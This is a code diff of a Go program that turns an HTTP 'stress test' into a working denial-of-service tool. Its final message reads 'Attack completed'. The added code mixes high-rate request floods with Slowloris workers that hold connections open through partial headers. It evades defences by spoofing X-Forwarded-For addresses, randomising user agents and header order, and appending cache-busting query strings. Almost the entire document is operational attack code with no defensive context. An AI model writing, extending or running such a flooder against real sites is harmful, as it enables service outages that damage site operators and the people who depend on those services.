@@ -14,24 +14,16 @@ import (
 
 var (
 	ip            string
-	ips           []string // List of resolved IPs for DNS Randomization
+	ips           []string
 	port          int
 	path          string
 	threads       int
 	timer         int
-	cookie        string
 	customHost    string
-	httpMethods   = []string{"GET", "HEAD"} // Random HTTP methods
-	basePath      string
-	platformChoices = []string{"Macintosh", "Windows", "X11", "Linux", "iPhone", "Android"}
-
-	macOSVersions   = []string{"68K", "PPC", "Intel Mac OS X 10_15_7", "Intel Mac OS X 11_2_3"}
-	windowsVersions = []string{"WinNT4.0", "Windows NT 10.0; Win64; x64"}
-	linuxVersions   = []string{"Linux x86_64", "Ubuntu; Linux x86_64"}
-	androidVersions = []string{"Android 11; Pixel 5"}
-	iphoneVersions  = []string{"iPhone; CPU iPhone OS 15_1 like Mac OS X"}
-
-	browsers = []string{"chrome", "firefox", "edge"}
+	httpMethods   = []string{"GET", "HEAD", "POST"}
+	userAgents    = []string{"Mozilla/5.0", "AppleWebKit/537.36", "Chrome/91.0", "Safari/537.36"}
+	platforms     = []string{"Macintosh", "Windows", "Linux", "Android", "iPhone"}
+	slowlorisRate = 0.3 // float64 type
 )
 
 func init() {
@@ -41,126 +33,137 @@ func init() {
 func resolveDNS(hostname string) {
 	addrs, err := net.LookupIP(hostname)
 	if err != nil {
-		fmt.Println("Failed to resolve DNS:", err)
+		fmt.Println("DNS resolution failed:", err)
 		os.Exit(1)
 	}
-
 	for _, addr := range addrs {
 		if ipv4 := addr.To4(); ipv4 != nil {
 			ips = append(ips, ipv4.String())
 		}
 	}
-
 	if len(ips) == 0 {
-		fmt.Println("No valid IP addresses resolved!")
+		fmt.Println("No IPs resolved")
 		os.Exit(1)
 	}
-
-	fmt.Printf("Resolved IPs: %v\n", ips)
 }
 
-func getUserAgent() string {
-	platform := platformChoices[rand.Intn(len(platformChoices))]
-	var os string
-
-	switch platform {
-	case "Macintosh":
-		os = macOSVersions[rand.Intn(len(macOSVersions))]
-	case "Windows":
-		os = windowsVersions[rand.Intn(len(windowsVersions))]
-	case "X11", "Linux":
-		os = linuxVersions[rand.Intn(len(linuxVersions))]
-	case "Android":
-		os = androidVersions[rand.Intn(len(androidVersions))]
-	case "iPhone":
-		os = iphoneVersions[rand.Intn(len(iphoneVersions))]
-	}
-
-	browser := browsers[rand.Intn(len(browsers))]
-	version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
-
-	switch browser {
-	case "chrome":
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, version)
-	case "firefox":
-		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", os, rand.Intn(99), rand.Intn(99))
-	default:
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36", os)
-	}
+func randomUserAgent() string {
+	return userAgents[rand.Intn(len(userAgents))] + " " + platforms[rand.Intn(len(platforms))]
 }
 
-func getHeader(method string) string {
-	hostHeader := ip
-	if customHost != "" {
-		hostHeader = customHost
+func buildRequest(method, path string) []byte {
+	host := customHost
+	if host == "" {
+		host = ip
 	}
 
-	/*referers := []string{
-		"https://www.google.com",
-		"https://www.bing.com",
-		"https://twitter.com",
-		fmt.Sprintf("https://%s", hostHeader),
-	}*/
-
-	languages := []string{
-		"en-US,en;q=0.9",
-		"en-GB,en;q=0.8",
-		"fr-FR,fr;q=0.9",
+	// Randomize header order and content
+	headers := []string{
+		fmt.Sprintf("Host: %s", host),
+		fmt.Sprintf("User-Agent: %s", randomUserAgent()),
+		"Accept: */*",
+		"Accept-Encoding: gzip, deflate",
+		fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)),
+		"Cache-Control: no-cache",
 	}
 
-	header := fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path)
-	header += fmt.Sprintf("Host: %s\r\n", hostHeader)
-	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
-	header += "Accept: */*\r\n"
-	header += "Accept-Encoding: gzip, deflate\r\n"
-	header += "Connection: keep-alive\r\n"
-	header += fmt.Sprintf("Referer: https://%s\r\n", hostHeader)
-	//header += fmt.Sprintf("Referer: %s\r\n", referers[rand.Intn(len(referers))])
-	header += fmt.Sprintf("Accept-Language: %s\r\n", languages[rand.Intn(len(languages))])
-	header += fmt.Sprintf("DNT: %d\r\n", rand.Intn(2))
-	header += "Upgrade-Insecure-Requests: 1\r\n"
-	//header += fmt.Sprintf("Cookie: %x\r\n", rand.Uint64())
-	header += "\r\n"
-	return header
+	if method == "POST" {
+		data := fmt.Sprintf("data=%d", rand.Intn(1000000))
+		headers = append(headers,
+			"Content-Type: application/x-www-form-urlencoded",
+			fmt.Sprintf("Content-Length: %d", len(data)),
+		)
+		rand.Shuffle(len(headers), func(i, j int) {
+			headers[i], headers[j] = headers[j], headers[i]
+		})
+		return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n%s",
+			method, path, joinHeaders(headers), data))
+	}
+
+	rand.Shuffle(len(headers), func(i, j int) {
+		headers[i], headers[j] = headers[j], headers[i]
+	})
+	return []byte(fmt.Sprintf("%s %s HTTP/1.1\r\n%s\r\n\r\n",
+		method, path, joinHeaders(headers)))
 }
 
-func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
-	defer wg.Done()
+func joinHeaders(headers []string) string {
+	var result string
+	for _, h := range headers {
+		result += h + "\r\n"
+	}
+	return result
+}
 
-	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: ip}
-	for count := range requestCount {
-		for {
-			randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
-			address := fmt.Sprintf("%s:%d", randomIP, port)
+func floodWorker(id int, stop <-chan struct{}) {
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true,
+		ServerName:         ip,
+	}
 
-			var conn net.Conn
-			var err error
-			if port == 443 {
-				conn, err = tls.Dial("tcp", address, tlsConfig)
-			} else {
-				conn, err = net.Dial("tcp", address)
-			}
-
+	for {
+		select {
+		case <-stop:
+			return
+		default:
+			target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
+			conn, err := createConnection(target, tlsConfig)
 			if err != nil {
-				fmt.Printf("Worker %d: connection error: %v\n", id, err)
-				time.Sleep(time.Second)
 				continue
 			}
 
-			for i := 0; i < count; i++ {
-				method := httpMethods[rand.Intn(len(httpMethods))] // Random HTTP method
-				header := getHeader(method)
-				time.Sleep(time.Millisecond * time.Duration(rand.Intn(80)))
-				_, err := conn.Write([]byte(header))
-				if err != nil {
-					fmt.Printf("Worker %d: write error: %v\n", id, err)
-					break
+			for i := 0; i < rand.Intn(50)+50; i++ { // 50-100 requests/connection
+				method := httpMethods[rand.Intn(len(httpMethods))]
+				reqPath := path
+				if rand.Intn(2) == 0 {
+					reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
+				}
+				conn.Write(buildRequest(method, reqPath))
+				time.Sleep(time.Millisecond * time.Duration(rand.Intn(15)))
+			}
+			conn.Close()
+		}
+	}
+}
+
+func slowlorisWorker(id int, stop <-chan struct{}) {
+	tlsConfig := &tls.Config{InsecureSkipVerify: true}
+
+	for {
+		select {
+		case <-stop:
+			return
+		default:
+			target := fmt.Sprintf("%s:%d", ips[rand.Intn(len(ips))], port)
+			conn, err := createConnection(target, tlsConfig)
+			if err != nil {
+				continue
+			}
+
+			partial := fmt.Sprintf("GET %s?slow=%d HTTP/1.1\r\nHost: %s\r\n", 
+				path, rand.Intn(10000), ip)
+			conn.Write([]byte(partial))
+
+			// Keep connection alive with partial headers
+			for i := 0; i < 10; i++ {
+				select {
+				case <-stop:
+					conn.Close()
+					return
+				case <-time.After(time.Second * 5):
+					conn.Write([]byte(fmt.Sprintf("X-a: %d\r\n", rand.Intn(100))))
 				}
 			}
 			conn.Close()
-			break
 		}
 	}
+}
+
+func createConnection(target string, tlsConfig *tls.Config) (net.Conn, error) {
+	if port == 443 {
+		return tls.Dial("tcp", target, tlsConfig)
+	}
+	return net.Dial("tcp", target)
 }
 
 func main() {
@@ -169,22 +172,22 @@ func main() {
 		return
 	}
 
-	parsedURL, err := url.Parse(os.Args[1])
+	u, err := url.Parse(os.Args[1])
 	if err != nil {
-		fmt.Println("Invalid URL:", err)
+		fmt.Println("URL error:", err)
 		return
 	}
 
-	ip = parsedURL.Hostname()
-	if parsedURL.Port() != "" {
-		port, _ = strconv.Atoi(parsedURL.Port())
-	} else if parsedURL.Scheme == "https" {
-		port = 443
-	} else {
-		port = 80
+	ip = u.Hostname()
+	port, _ = strconv.Atoi(u.Port())
+	if port == 0 {
+		if u.Scheme == "https" {
+			port = 443
+		} else {
+			port = 80
+		}
 	}
-
-	path = parsedURL.Path
+	path = u.Path
 	if path == "" {
 		path = "/"
 	}
@@ -196,33 +199,27 @@ func main() {
 	}
 
 	resolveDNS(ip)
+	fmt.Printf("Target: %s:%d (%d IPs)\n", ip, port, len(ips))
 
-	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
-	if customHost != "" {
-		fmt.Printf("Using custom Host header: %s\n", customHost)
-	}
-
+	stop := make(chan struct{})
 	var wg sync.WaitGroup
-	requestCount := make(chan int, threads)
 
+	// Start workers
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
-		go worker(i, &wg, requestCount)
+		go func(id int) {
+			defer wg.Done()
+			if rand.Float64() < slowlorisRate {
+				slowlorisWorker(id, stop)
+			} else {
+				floodWorker(id, stop)
+			}
+		}(i)
 	}
 
-	go func() {
-		ticker := time.NewTicker(1 * time.Second)
-		defer ticker.Stop()
-
-		for t := 0; t < timer; t++ {
-			<-ticker.C
-			for i := 0; i < threads; i++ {
-				requestCount <- 200
-			}
-		}
-		close(requestCount)
-	}()
-
+	// Run for specified duration
+	time.Sleep(time.Duration(timer) * time.Second)
+	close(stop)
 	wg.Wait()
-	fmt.Println("Stress test completed.")
+	fmt.Println("Attack completed")
 }
